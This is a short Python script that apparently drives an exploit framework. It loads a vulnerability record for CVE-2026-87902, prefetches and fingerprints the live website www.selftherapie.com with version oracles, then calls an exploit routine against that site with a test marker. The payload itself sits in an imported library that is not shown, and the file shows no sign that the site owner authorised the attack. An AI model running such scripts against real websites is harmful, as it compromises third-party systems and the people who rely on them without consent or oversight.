import traceback
from core import vuln, oracles

v = vuln.load("CVE-2026-87902")
base = "https://www.selftherapie.com"
vuln.deadline(120)

try:
    pf = vuln._cached_prefetch("www.selftherapie.com")
    print("prefetch:", pf.get("ok"))
    res = oracles.evaluate(base, v["oracles"], vuln._req, vuln.os.path.join(vuln.DB, v["id"]))
    print("oracles:", res["version"], res["evidence"])
    print("exploit:", vuln._exploit(base, v["exploit"], "PBLTEST123"))
except Exception:
    traceback.print_exc()